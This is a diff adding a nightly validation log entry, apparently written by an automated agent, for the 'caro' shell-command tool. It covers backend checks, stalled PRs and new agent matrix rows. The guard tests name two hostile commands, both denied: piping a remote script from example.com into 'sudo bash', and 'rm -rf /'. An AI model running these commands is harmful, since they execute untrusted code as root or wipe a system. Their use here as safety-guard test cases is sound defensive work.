@@ -5,6 +5,16 @@
 
 ---
 
+## 2026-10-30 (23:00 PT fire) — validation-only; backlog still stalled, no PR
+
+- **Validated:** ✓ VERIFIED against published `caro 1.5.0` (crates.io `max_version` still 1.5.0, 2026-10-13). Ollama/vLLM/Exo: PASS for the loud-error contract. `--backend <name> --dry-run` → `requires the 'remote-backends' feature`, exit 1. MLX/embedded: PASS for `show disk usage` → `df -h` in 0.27 s. `list pdf files in current directory` → `ls -la`, so #1645 is unchanged. Codex guard (`--harness codex --mode enforce`): PASS, `curl https://example.com/x.sh | sudo bash` → `deny`. Claude Code guard: `rm -rf /` → `deny`. #1723 re-check: `sleep 20 | caro --dry-run "list pdf files"` still hangs (alarm rc=142).
+- **Shipped:** no PR. Every failure already has an issue or an open fix PR (#1645, #1723 → #1043). Nothing merged since 2026-10-24. 10 integrator-area PRs are open: #1738, #1722 and #1043 are `CLEAN`; #1719, #1713, #1708, #1624, #1492, #1348 and #1153 are `DIRTY`. A new PR would only grow the queue. This entry rides on #1719's branch.
+- **Filed:** none. Dedup: `uipath OR cline` matched no `integration` issue.
+- **Discovered:** two terminal agents had no matrix row. Cline CLI (open-source, CLI 2.0) and UiPath for Coding Agents (`uip` CLI, public preview July 2026) were added as ⏳. Neither was filed: same reasoning as Kiro, low leverage until #928/#929. No October 2026 launch found (2 queries).
+- **Next pass should:** check whether #1738 merged and whether a human merged `main` into #1719. If the backlog is still stalled, keep running validation-only nights. #1732 stays the next quick-win code PR once fewer than 5 integrator PRs are open.
+
+---
+
 ## 2026-10-29 (23:00 PT fire) — README agent table fixed (PR #1738); Claude/Grok rows re-dated
 
 - **Validated:** ✓ VERIFIED against published `caro 1.5.0` (crates.io `max_version` still 1.5.0). Anthropic Claude API: PASS for the loud-error contract, `--backend claude` → `requires the 'remote-backends' feature`, exit 1. xAI Grok: PASS, same error. Both rows were stale `🚧 in-progress` from 2026-10-03 on this branch. README "Use Caro from your agent" table: FAIL. MCP (#928) and OpenAI shim (#929) are marked 🚧 with no implementation, OpenRouter is marked ⏳ though it routes in a `remote-backends` build, the Gemini row cites closed PR #782, and the shipped `caro guard` hook is missing. `caro guard --mode enforce` with `rm -rf /` → deny (re-checked for the new README row).
